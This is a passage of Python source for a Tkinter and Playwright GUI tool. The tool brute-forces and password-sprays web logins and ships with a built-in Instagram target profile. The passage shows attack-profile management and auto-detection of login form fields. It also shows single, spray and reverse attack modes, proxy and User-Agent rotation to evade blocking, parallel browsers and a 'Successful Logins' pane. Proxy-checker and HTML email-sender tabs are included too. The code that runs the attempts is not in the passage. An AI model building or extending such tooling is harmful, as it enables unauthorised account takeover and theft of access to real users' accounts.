            self.save_attacks()

    def save_attacks(self):
        with open(ATTACKS_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.attacks, f, indent=4)

    def update_attack_dropdown(self):
        if hasattr(self, 'attack_combobox') and self.attack_combobox:
            names = [a["name"] for a in self.attacks]
            self.attack_combobox['values'] = names
            if self.selected_attack:
                try:
                    idx = names.index(self.selected_attack["name"])
                    self.attack_combobox.current(idx)
                except ValueError:
                    self.attack_combobox.current(0)
                    self.selected_attack = self.attacks[0] if self.attacks else None
            elif self.attacks:
                self.attack_combobox.current(0)
                self.selected_attack = self.attacks[0]

    def on_attack_selected(self, event):
        idx = self.attack_combobox.current()
        if 0 <= idx < len(self.attacks):
            self.selected_attack = self.attacks[idx]
            self.custom_url.set(self.selected_attack["url"])
            self.username_field_type.set(self.selected_attack["username_field_type"])
            self.username_field_selector.set(self.selected_attack["username_field_selector"])
            self.password_field_type.set(self.selected_attack["password_field_type"])
            self.password_field_selector.set(self.selected_attack["password_field_selector"])
            self.submit_button_selector.set(self.selected_attack["submit_button_selector"])
            self.success_indicator.set(self.selected_attack["success_indicator"])
            self.success_text.set(self.selected_attack.get("success_text", ""))
            self.failure_text.set(self.selected_attack.get("failure_text", ""))
            self.timeout_var.set(self.selected_attack.get("timeout", 5000))
        else:
            self.selected_attack = None

    def add_attack(self):
        dialog = AttackConfigDialog(self.root)
        if dialog.result:
            if any(a["name"] == dialog.result["name"] for a in self.attacks):
                messagebox.showerror("Error", "A profile with this name already exists.")
                return
            self.attacks.append(dialog.result)
            self.save_attacks()
            self.update_attack_dropdown()

    def edit_attack(self):
        if not self.selected_attack:
            messagebox.showerror("Error", "No attack selected.")
            return
        dialog = AttackConfigDialog(self.root, self.selected_attack)
        if dialog.result:
            idx = self.attacks.index(self.selected_attack)
            self.attacks[idx] = dialog.result
            self.save_attacks()
            self.selected_attack = self.attacks[idx]
            self.update_attack_dropdown()
            self.on_attack_selected(None)

    def delete_attack(self):
        if not self.selected_attack:
            messagebox.showerror("Error", "No attack selected.")
            return
        if self.selected_attack["name"] == "Instagram (Default)":
            messagebox.showerror("Error", "Cannot delete the default Instagram profile.")
            return
        if messagebox.askyesno("Confirm Delete", f"Delete profile '{self.selected_attack['name']}'?"):
            self.attacks.remove(self.selected_attack)
            self.save_attacks()
            self.selected_attack = None
            self.update_attack_dropdown()

    def save_current_as_new_attack(self):
        name = simpledialog.askstring("New Profile", "Enter a name for this new profile:", parent=self.root)
        if not name:
            return
        if any(a["name"] == name for a in self.attacks):
            messagebox.showerror("Error", "A profile with this name already exists.")
            return
        failure_text_val = self.failure_text.get().strip()
        if not failure_text_val:
            messagebox.showerror("Error", "Failure message is required for correct detection.")
            return
        new_config = {
            "name": name,
            "url": self.custom_url.get().strip(),
            "username_field_type": self.username_field_type.get(),
            "username_field_selector": self.username_field_selector.get(),
            "password_field_type": self.password_field_type.get(),
            "password_field_selector": self.password_field_selector.get(),
            "submit_button_selector": self.submit_button_selector.get(),
            "success_indicator": self.success_indicator.get(),
            "success_text": self.success_text.get().strip(),
            "failure_text": failure_text_val,
            "timeout": self.timeout_var.get(),
        }
        if not new_config["url"]:
            messagebox.showerror("Error", "URL cannot be empty.")
            return
        self.attacks.append(new_config)
        self.save_attacks()
        self.update_attack_dropdown()
        messagebox.showinfo("Success", f"Profile '{name}' saved successfully.")

    def create_failure_tool(self):
        dialog = FailureToolDialog(self.root, self.auto_detect_fields)
        if dialog.result:
            if any(a["name"] == dialog.result["name"] for a in self.attacks):
                messagebox.showerror("Error", "A profile with this name already exists.")
                return
            self.attacks.append(dialog.result)
            self.save_attacks()
            self.update_attack_dropdown()
            messagebox.showinfo("Success", f"Failure detection tool '{dialog.result['name']}' created.")

    def auto_detect_fields(self):
        url = self.custom_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a login URL first.")
            return
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(url, wait_until="domcontentloaded", timeout=10000)
                inputs = page.query_selector_all("input")
                username_candidates = []
                password_candidates = []
                for inp in inputs:
                    inp_type = inp.get_attribute("type") or ""
                    inp_name = inp.get_attribute("name") or ""
                    inp_id = inp.get_attribute("id") or ""
                    if inp_type == "password":
                        password_candidates.append((inp_name, inp_id))
                    elif inp_type in ("text", "email", "tel", None):
                        if any(key in inp_name.lower() for key in ["user", "email", "login", "username"]):
                            username_candidates.append((inp_name, inp_id))
                browser.close()
            if username_candidates:
                name_or_id, selector = username_candidates[0]
                if name_or_id:
                    self.username_field_type.set("name")
                    self.username_field_selector.set(name_or_id)
                elif selector:
                    self.username_field_type.set("id")
                    self.username_field_selector.set(selector)
                messagebox.showinfo("Auto-Detect", f"Username field: {name_or_id or selector}")
            else:
                messagebox.showwarning("Auto-Detect", "Could not detect username field.")
            if password_candidates:
                name_or_id, selector = password_candidates[0]
                if name_or_id:
                    self.password_field_type.set("name")
                    self.password_field_selector.set(name_or_id)
                elif selector:
                    self.password_field_type.set("id")
                    self.password_field_selector.set(selector)
                messagebox.showinfo("Auto-Detect", f"Password field: {name_or_id or selector}")
            else:
                messagebox.showwarning("Auto-Detect", "Could not detect password field.")
        except Exception as e:
            messagebox.showerror("Auto-Detect Error", str(e))

    def open_password_list_dialog(self):
        PasswordListDialog(self.root)

    def open_username_search_dialog(self):
        UsernameSearchDialog(self.root)

    # ---------- Animation Methods ----------
    def start_button_pulse(self):
        """Pulse animation for the Start button by updating the ttk style."""
        if self.running:
            return
        if not hasattr(self, 'start_btn'):
            return
        self.pulse_intensity += self.pulse_direction * 0.05
        if self.pulse_intensity >= 1.0:
            self.pulse_intensity = 1.0
            self.pulse_direction = -1
        elif self.pulse_intensity <= 0.2:
            self.pulse_intensity = 0.2
            self.pulse_direction = 1
        # Interpolate between dark green and bright neon
        r1, g1, b1 = 17, 17, 17  # #111111
        r2, g2, b2 = 0, 255, 153  # #00ff99
        r = int(r1 + (r2 - r1) * self.pulse_intensity)
        g = int(g1 + (g2 - g1) * self.pulse_intensity)
        b = int(b1 + (b2 - b1) * self.pulse_intensity)
        color = f"#{r:02x}{g:02x}{b:02x}"
        # Update the style for Pulse.TButton
        self.style.configure("Pulse.TButton", background=color)
        self.pulse_after_id = self.root.after(50, self.start_button_pulse)

    def stop_button_pulse(self):
        if self.pulse_after_id:
            self.root.after_cancel(self.pulse_after_id)
            self.pulse_after_id = None
        # Reset to default color
        self.style.configure("Pulse.TButton", background=HACKER_COLORS["button_bg"])

    def create_spinner(self, parent):
        """Create a canvas spinner in the status bar."""
        self.spinner_canvas = tk.Canvas(parent, width=20, height=20, bg=HACKER_COLORS["stats_bg"], highlightthickness=0)
        self.spinner_canvas.pack(side=tk.RIGHT, padx=5)
        self.spinner_canvas.pack_forget()
        self.spinner_angle = 0

    def draw_spinner(self):
        if not self.spinner_canvas or not self.running:
            return
        self.spinner_canvas.delete("all")
        w = 20
        h = 20
        cx = w//2
        cy = h//2
        radius = 8
        for i in range(8):
            angle = self.spinner_angle + i * 45
            rad = math.radians(angle)
            x1 = cx + (radius-3) * math.cos(rad)
            y1 = cy + (radius-3) * math.sin(rad)
            x2 = cx + radius * math.cos(rad)
            y2 = cy + radius * math.sin(rad)
            color = HACKER_COLORS["fg"] if i % 2 == 0 else HACKER_COLORS["hover_bg"]
            self.spinner_canvas.create_line(x1, y1, x2, y2, width=2, capstyle=tk.ROUND, fill=color)
        self.spinner_angle = (self.spinner_angle + 10) % 360
        self.spinner_after_id = self.root.after(50, self.draw_spinner)

    def start_spinner(self):
        if self.spinner_canvas:
            self.spinner_canvas.pack(side=tk.RIGHT, padx=5)
            self.draw_spinner()

    def stop_spinner(self):
        if self.spinner_after_id:
            self.root.after_cancel(self.spinner_after_id)
            self.spinner_after_id = None
        if self.spinner_canvas:
            self.spinner_canvas.pack_forget()
            self.spinner_canvas.delete("all")

    # ---------- GUI Construction ----------
    def create_widgets(self):
        self.style = ttk.Style()
        setup_style(self.style, self.custom_colors)

        # Main PanedWindow
        main_paned = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
        main_paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Toolbar
        toolbar_frame = ttk.Frame(main_paned, padding=5, relief=tk.RAISED)
        main_paned.add(toolbar_frame, weight=0)

        ttk.Label(toolbar_frame, text="Attack Profile:", font=('Consolas', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        self.attack_combobox = ttk.Combobox(toolbar_frame, state="readonly", width=40)
        self.attack_combobox.pack(side=tk.LEFT, padx=5)
        self.attack_combobox.bind("<<ComboboxSelected>>", self.on_attack_selected)

        for text, cmd in [("New", self.add_attack), ("Edit", self.edit_attack), ("Delete", self.delete_attack),
                          ("Save as New", self.save_current_as_new_attack), ("Auto-Detect", self.auto_detect_fields),
                          ("New Failure Tool", self.create_failure_tool),
                          ("Create Password List", self.open_password_list_dialog),
                          ("Search Profile", self.open_username_search_dialog)]:
            ttk.Button(toolbar_frame, text=text, command=cmd, style="Rounded.TButton").pack(side=tk.LEFT, padx=2)

        # Notebook
        notebook_frame = ttk.Frame(main_paned)
        main_paned.add(notebook_frame, weight=1)
        self.notebook = ttk.Notebook(notebook_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        self.target_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.target_tab, text="Target")
        self.attack_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.attack_tab, text="Attack")
        self.colors_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.colors_tab, text="Colors")
        self.proxy_check_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.proxy_check_tab, text="Proxy Checker")
        self.email_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.email_tab, text="Email Sender")

        self.create_target_tab()
        self.create_attack_tab()
        self.create_colors_tab()
        self.create_proxy_check_tab()
        self.create_email_tab()

        # Status bar with progress and spinner
        status_frame = ttk.Frame(main_paned)
        main_paned.add(status_frame, weight=0)
        self.status_label = ttk.Label(status_frame, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=2)
        self.progress_bar = ttk.Progressbar(status_frame, orient=tk.HORIZONTAL, length=200, mode='determinate')
        self.progress_bar.pack(side=tk.RIGHT, padx=5)
        self.progress_bar.pack_forget()
        self.create_spinner(status_frame)

        self.mode.trace_add("write", self.on_mode_change)
        self.on_mode_change()

    def create_target_tab(self):
        frame = ttk.Frame(self.target_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        mode_frame = ttk.LabelFrame(frame, text="Target Mode", padding=5)
        mode_frame.pack(fill=tk.X, pady=5)
        ttk.Radiobutton(mode_frame, text="Use Saved Profile", variable=self.attack_mode, value="saved").pack(anchor=tk.W)
        ttk.Radiobutton(mode_frame, text="Custom (Edit below)", variable=self.attack_mode, value="custom").pack(anchor=tk.W)

        custom_frame = ttk.LabelFrame(frame, text="Custom Target Settings", padding=10)
        custom_frame.pack(fill=tk.X, pady=5)

        url_row = ttk.Frame(custom_frame)
        url_row.grid(row=0, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=2)
        ttk.Label(url_row, text="Login URL:").pack(side=tk.LEFT)
        self.url_entry = ttk.Entry(url_row, textvariable=self.custom_url, width=50)
        self.url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        ttk.Label(custom_frame, text="Username Field:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        uname_frame = ttk.Frame(custom_frame)
        uname_frame.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        ttk.Radiobutton(uname_frame, text="name=", variable=self.username_field_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(uname_frame, text="id=", variable=self.username_field_type, value="id").pack(side=tk.LEFT)
        ttk.Entry(uname_frame, textvariable=self.username_field_selector, width=20).pack(side=tk.LEFT, padx=5)

        ttk.Label(custom_frame, text="Password Field:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        pwd_frame = ttk.Frame(custom_frame)
        pwd_frame.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        ttk.Radiobutton(pwd_frame, text="name=", variable=self.password_field_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(pwd_frame, text="id=", variable=self.password_field_type, value="id").pack(side=tk.LEFT)
        ttk.Entry(pwd_frame, textvariable=self.password_field_selector, width=20).pack(side=tk.LEFT, padx=5)

        ttk.Label(custom_frame, text="Submit Button (CSS):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        ttk.Entry(custom_frame, textvariable=self.submit_button_selector, width=40).grid(row=3, column=1, padx=5, pady=2)

        ttk.Label(custom_frame, text="Success Indicator:").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        ind_frame = ttk.Frame(custom_frame)
        ind_frame.grid(row=4, column=1, sticky=tk.W, padx=5, pady=2)
        ttk.Radiobutton(ind_frame, text="URL change (no 'login' in URL)", variable=self.success_indicator, value="url_change").pack(anchor=tk.W)
        ttk.Radiobutton(ind_frame, text="Text in page", variable=self.success_indicator, value="text").pack(anchor=tk.W)
        ttk.Entry(ind_frame, textvariable=self.success_text, width=30).pack(anchor=tk.W, padx=20, pady=2)

        ttk.Label(custom_frame, text="Failure Message (required):").grid(row=5, column=0, sticky=tk.W, padx=5, pady=2)
        ttk.Entry(custom_frame, textvariable=self.failure_text, width=40).grid(row=5, column=1, padx=5, pady=2)

        ttk.Label(custom_frame, text="Timeout (ms):").grid(row=6, column=0, sticky=tk.W, padx=5, pady=2)
        self.timeout_entry = ttk.Entry(custom_frame, textvariable=self.timeout_var, width=10)
        self.timeout_entry.grid(row=6, column=1, sticky=tk.W, padx=5, pady=2)

        def on_mode_change(*args):
            state = tk.NORMAL if self.attack_mode.get() == "custom" else tk.DISABLED
            for child in custom_frame.winfo_children():
                if isinstance(child, (ttk.Entry, ttk.Radiobutton)):
                    child.config(state=state)
            self.timeout_entry.config(state=state)
        self.attack_mode.trace_add("write", on_mode_change)
        on_mode_change()

    def create_attack_tab(self):
        vpaned = ttk.PanedWindow(self.attack_tab, orient=tk.VERTICAL)
        vpaned.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        top_frame = ttk.LabelFrame(vpaned, text="Attack Settings", padding=10)
        vpaned.add(top_frame, weight=0)

        mode_frame = ttk.LabelFrame(top_frame, text="Attack Mode", padding=5)
        mode_frame.grid(row=0, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=5)
        ttk.Radiobutton(mode_frame, text="Single Username + Password List", variable=self.mode, value="single").pack(anchor=tk.W)
        ttk.Radiobutton(mode_frame, text="Username List + Password List (Spray)", variable=self.mode, value="multi").pack(anchor=tk.W)
        ttk.Radiobutton(mode_frame, text="Single Password + Username List (Reverse)", variable=self.mode, value="reverse").pack(anchor=tk.W)

        input_frame = ttk.Frame(top_frame)
        input_frame.grid(row=1, column=0, sticky=tk.W+tk.E, padx=5, pady=5)

        self.username_label = ttk.Label(input_frame, text="Username:")
        self.username_entry = ttk.Entry(input_frame, textvariable=self.username_single, width=30)
        self.username_label.grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.username_entry.grid(row=0, column=1, padx=5, pady=2)

        self.userlist_label = ttk.Label(input_frame, text="Username List:")
        self.userlist_entry = ttk.Entry(input_frame, textvariable=self.userlist_path, width=30)
        self.userlist_btn = ttk.Button(input_frame, text="Browse", command=lambda: self.browse_file(self.userlist_path), style="Rounded.TButton")
        self.userlist_label.grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.userlist_entry.grid(row=1, column=1, padx=5, pady=2)
        self.userlist_btn.grid(row=1, column=2, padx=5)
        self.userlist_label.grid_remove()
        self.userlist_entry.grid_remove()
        self.userlist_btn.grid_remove()

        self.passlist_label = ttk.Label(input_frame, text="Password List:")
        self.passlist_entry = ttk.Entry(input_frame, textvariable=self.passlist_path, width=30)
        self.passlist_btn = ttk.Button(input_frame, text="Browse", command=lambda: self.browse_file(self.passlist_path), style="Rounded.TButton")
        self.passlist_label.grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.passlist_entry.grid(row=2, column=1, padx=5, pady=2)
        self.passlist_btn.grid(row=2, column=2, padx=5)

        self.pass_single_label = ttk.Label(input_frame, text="Password:")
        self.pass_single_entry = ttk.Entry(input_frame, textvariable=self.pass_single, width=30)
        self.pass_single_label.grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        self.pass_single_entry.grid(row=3, column=1, padx=5, pady=2)
        self.pass_single_label.grid_remove()
        self.pass_single_entry.grid_remove()

        # Proxy settings
        proxy_frame = ttk.LabelFrame(top_frame, text="Proxy Settings", padding=5)
        proxy_frame.grid(row=2, column=0, sticky=tk.W+tk.E, padx=5, pady=5, columnspan=2)

        self.use_proxy_var = ttk.Checkbutton(proxy_frame, text="Use Proxies", variable=self.use_proxy,
                                             command=self.toggle_proxy_widgets)
        self.use_proxy_var.pack(anchor=tk.W)

        proxy_inner = ttk.Frame(proxy_frame)
        proxy_inner.pack(fill=tk.X, padx=10)

        ttk.Label(proxy_inner, text="Proxy List:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.proxy_entry = ttk.Entry(proxy_inner, textvariable=self.proxy_path, width=30)
        self.proxy_entry.grid(row=0, column=1, padx=5)
        self.proxy_browse_btn = ttk.Button(proxy_inner, text="Browse", command=lambda: self.browse_file(self.proxy_path), style="Rounded.TButton")
        self.proxy_browse_btn.grid(row=0, column=2, padx=5)

        ttk.Label(proxy_inner, text="Proxy Type:").grid(row=1, column=0, sticky=tk.W, padx=5)
        proxy_type_frame = ttk.Frame(proxy_inner)
        proxy_type_frame.grid(row=1, column=1, sticky=tk.W)
        for text, value in [("SOCKS5", "socks5"), ("SOCKS4", "socks4"), ("HTTP", "http")]:
            ttk.Radiobutton(proxy_type_frame, text=text, variable=self.proxy_type, value=value).pack(side=tk.LEFT, padx=5)

        # User-Agent
        ua_frame = ttk.LabelFrame(top_frame, text="User-Agent Rotation", padding=5)
        ua_frame.grid(row=3, column=0, sticky=tk.W+tk.E, padx=5, pady=5, columnspan=2)

        ttk.Label(ua_frame, text="User-Agent List:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.ua_entry = ttk.Entry(ua_frame, textvariable=self.useragent_path, width=40)
        self.ua_entry.grid(row=0, column=1, padx=5, pady=2)
        ttk.Button(ua_frame, text="Browse", command=lambda: self.browse_file(self.useragent_path), style="Rounded.TButton").grid(row=0, column=2, padx=5, pady=2)
        ttk.Label(ua_frame, text="(One UA per line, rotates randomly)").grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)

        # Browsers
        browsers_frame = ttk.Frame(top_frame)
        browsers_frame.grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Label(browsers_frame, text="Number of Browsers:").pack(side=tk.LEFT, padx=5)
        self.browsers_spin = ttk.Spinbox(browsers_frame, from_=1, to=10, textvariable=self.num_browsers, width=5)
        self.browsers_spin.pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(browsers_frame, text="Show Browser Windows", variable=self.show_browser).pack(side=tk.LEFT, padx=10)

        # Log format
        log_format_frame = ttk.LabelFrame(top_frame, text="Log Format", padding=5)
        log_format_frame.grid(row=5, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=5)

        fields = [("Timestamp", "timestamp"), ("Attempt #", "attempt_num"), ("Username", "username"),
                  ("Password", "password"), ("Proxy", "proxy"), ("Result", "result")]
        for i, (label, key) in enumerate(fields):
            cb = ttk.Checkbutton(log_format_frame, text=label, variable=self.log_fields[key])
            cb.grid(row=0, column=i, padx=5, pady=2, sticky=tk.W)

        btn_frame = ttk.Frame(top_frame)
        btn_frame.grid(row=6, column=0, columnspan=2, pady=10)

        self.start_btn = ttk.Button(btn_frame, text="Start Attack", command=self.start_attack, style="Pulse.TButton")
        self.start_btn.pack(side=tk.LEFT, padx=10)
        self.stop_btn = ttk.Button(btn_frame, text="Stop", command=self.stop_attack, style="Rounded.TButton", state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="Clear Logs", command=self.clear_logs, style="Rounded.TButton").pack(side=tk.LEFT, padx=10)

        ttk.Label(btn_frame, text="Log Font Size:").pack(side=tk.LEFT, padx=(20,5))
        font_sizes = [8,9,10,11,12,14,16,18,20]
        font_combo = ttk.Combobox(btn_frame, textvariable=self.log_font_size, values=font_sizes, width=5, state='readonly')
        font_combo.pack(side=tk.LEFT, padx=5)
        font_combo.bind("<<ComboboxSelected>>", self.change_log_font_size)

        # Bottom logs
        bottom_frame = ttk.Frame(vpaned)
        vpaned.add(bottom_frame, weight=1)

        main_frame = ttk.PanedWindow(bottom_frame, orient=tk.HORIZONTAL)
        main_frame.pack(fill=tk.BOTH, expand=True)

        left_frame = ttk.LabelFrame(main_frame, text="All Attempts Log", padding=5)
        main_frame.add(left_frame, weight=1)
        self.log_text = scrolledtext.ScrolledText(left_frame, wrap=tk.NONE, font=("Courier", self.log_font_size.get()))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.tag_configure("success", foreground=HACKER_COLORS["success_fg"], font=("Courier", self.log_font_size.get(), "bold"))
        self.log_text.tag_configure("failure", foreground=HACKER_COLORS["failure_fg"])

        right_frame = ttk.LabelFrame(main_frame, text="Successful Logins", padding=5)
        main_frame.add(right_frame, weight=1)
        self.success_text_widget = scrolledtext.ScrolledText(right_frame, wrap=tk.NONE, font=("Courier", self.log_font_size.get()))
        self.success_text_widget.pack(fill=tk.BOTH, expand=True)

        stats_frame = ttk.LabelFrame(bottom_frame, text="Statistics", padding=5)
        stats_frame.pack(fill=tk.X, pady=5)

        self.stats_labels = {}
        stats_info = [("Total Attempts:", "total"), ("Tested:", "tested"), ("Proxy Rotations:", "rotations"),
                      ("Current Proxy:", "current_proxy"), ("Time Elapsed:", "elapsed"), ("Remaining:", "remaining"),
                      ("Status:", "status")]
        for label_text, key in stats_info:
            row = ttk.Frame(stats_frame)
            row.pack(side=tk.LEFT, padx=10, pady=2)
            ttk.Label(row, text=label_text).pack(side=tk.LEFT)
            lbl_val = ttk.Label(row, text="--", anchor=tk.W, relief=tk.SUNKEN, width=15)
            lbl_val.pack(side=tk.LEFT, padx=5)
            self.stats_labels[key] = lbl_val

    def create_colors_tab(self):
        frame = ttk.Frame(self.colors_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        color_items = [("Main Background", "bg"), ("Text Color", "fg"), ("Entry Background", "entry_bg"),
                       ("Entry Text", "entry_fg"), ("Button Background", "button_bg"), ("Button Text", "button_fg"),
                       ("Tab Background", "tab_bg"), ("Tab Text", "tab_fg"), ("Log Background", "log_bg"),
                       ("Log Text", "log_fg"), ("Stats Background", "stats_bg"), ("Stats Text", "stats_fg"),
                       ("Success Color", "success_fg"), ("Failure Color", "failure_fg")]

        row = 0
        for label, key in color_items:
            ttk.Label(frame, text=f"{label}:").grid(row=row, column=0, sticky=tk.W, padx=5, pady=2)
            btn = ttk.Button(frame, text="Choose", command=lambda k=key: self.pick_color(k), style="Rounded.TButton")
            btn.grid(row=row, column=1, padx=5, pady=2, sticky=tk.W)
            lbl_color = ttk.Label(frame, text=self.custom_colors[key], background=self.custom_colors[key], width=15)
            lbl_color.grid(row=row, column=2, padx=5, pady=2)
            row += 1

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=row, column=0, columnspan=3, pady=10)
        ttk.Button(btn_frame, text="Apply Colors", command=self.apply_theme, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Reset to Hacker Theme", command=self.reset_to_default_theme, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save Colors", command=self.save_color_config, style="Rounded.TButton").pack(side=tk.LEFT, padx=5)

    def create_proxy_check_tab(self):
        frame = ttk.Frame(self.proxy_check_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Proxy List File:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_check_entry = ttk.Entry(frame, textvariable=self.proxy_check_path, width=50)
        self.proxy_check_entry.grid(row=0, column=1, padx=5, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_file(self.proxy_check_path), style="Rounded.TButton").grid(row=0, column=2, padx=5, pady=5)

        ttk.Label(frame, text="Timeout (seconds):").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_timeout = tk.IntVar(value=5)
        ttk.Spinbox(frame, from_=1, to=30, textvariable=self.proxy_timeout, width=5).grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(frame, text="Threads:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_threads = tk.IntVar(value=10)
        ttk.Spinbox(frame, from_=1, to=50, textvariable=self.proxy_threads, width=5).grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)

        self.proxy_check_btn = ttk.Button(frame, text="Start Proxy Check", command=self.start_proxy_check, style="Rounded.TButton")
        self.proxy_check_btn.grid(row=3, column=0, columnspan=3, pady=10)

        ttk.Label(frame, text="Results:").grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_check_result_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=20, font=("Courier", 9))
        self.proxy_check_result_text.grid(row=5, column=0, columnspan=3, padx=5, pady=5, sticky=tk.NSEW)

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(5, weight=1)

    def create_email_tab(self):
        frame = ttk.Frame(self.email_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Sender Email:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.email_sender, width=40).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(frame, text="App Password:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.email_password, width=40, show="*").grid(row=1, column=1, padx=5, pady=5)

        ttk.Label(frame, text="Receiver Email:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.email_receiver, width=40).grid(row=2, column=1, padx=5, pady=5)

        ttk.Label(frame, text="HTML Message File:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
        html_frame = ttk.Frame(frame)
        html_frame.grid(row=3, column=1, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(html_frame, textvariable=self.email_html_path, width=30).pack(side=tk.LEFT)
        ttk.Button(html_frame, text="Browse", command=lambda: self.browse_file(self.email_html_path), style="Rounded.TButton").pack(side=tk.LEFT, padx=5)

        self.email_send_btn = ttk.Button(frame, text="Send Email", command=self.send_email, style="Rounded.TButton")
        self.email_send_btn.grid(row=4, column=0, columnspan=2, pady=10)

        ttk.Label(frame, text="Log:").grid(row=5, column=0, sticky=tk.W, padx=5, pady=5)
        self.email_log_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=15, font=("Courier", 9))
        self.email_log_text.grid(row=6, column=0, columnspan=2, padx=5, pady=5, sticky=tk.NSEW)

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(6, weight=1)

    # ---------- Utility Methods ----------
    def toggle_proxy_widgets(self):
        state = tk.NORMAL if self.use_proxy.get() else tk.DISABLED
        self.proxy_entry.config(state=state)
        self.proxy_browse_btn.config(state=state)

    def browse_file(self, var):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            var.set(filename)

    def on_mode_change(self, *args):
        mode = self.mode.get()
        self.username_label.grid_remove()
        self.username_entry.grid_remove()
        self.userlist_label.grid_remove()
        self.userlist_entry.grid_remove()
        self.userlist_btn.grid_remove()
        self.pass_single_label.grid_remove()
        self.pass_single_entry.grid_remove()
        if mode == "single":
            self.username_label.grid()
            self.username_entry.grid()
            self.passlist_label.grid()
            self.passlist_entry.grid()
            self.passlist_btn.grid()
        elif mode == "multi":
            self.userlist_label.grid()
            self.userlist_entry.grid()
            self.userlist_btn.grid()
            self.passlist_label.grid()
            self.passlist_entry.grid()
            self.passlist_btn.grid()
        elif mode == "reverse":
            self.userlist_label.grid()
            self.userlist_entry.grid()
            self.userlist_btn.grid()
            self.pass_single_label.grid()
            self.pass_single_entry.grid()

    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.success_text_widget.delete(1.0, tk.END)

    def change_log_font_size(self, event=None):
        new_size = self.log_font_size.get()
        self.log_text.configure(font=("Courier", new_size))
        self.success_text_widget.configure(font=("Courier", new_size))
        self.log_text.tag_configure("success", font=("Courier", new_size, "bold"))
        self.log_text.tag_configure("failure", font=("Courier", new_size))

    # ---------- Theme and Colors ----------
    def load_color_config(self):
        if os.path.exists(COLORS_CONFIG_FILE):
            try:
                with open(COLORS_CONFIG_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                self.custom_colors.update(data)
            except:
                pass

    def save_color_config(self):
        with open(COLORS_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.custom_colors, f, indent=4)
        messagebox.showinfo("Success", "Colors saved successfully.")

    def reset_to_default_theme(self):
        self.custom_colors.update(HACKER_COLORS)
        self.apply_theme()
        messagebox.showinfo("Success", "Reset to hacker theme.")

    def pick_color(self, key):
        color = colorchooser.askcolor(title=f"Choose {key}", initialcolor=self.custom_colors[key])
        if color[1]:
            self.custom_colors[key] = color[1]
            self.apply_theme()

    def apply_theme(self):
        setup_style(self.style, self.custom_colors)
        self.root.configure(bg=self.custom_colors["bg"])
        self.log_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"],
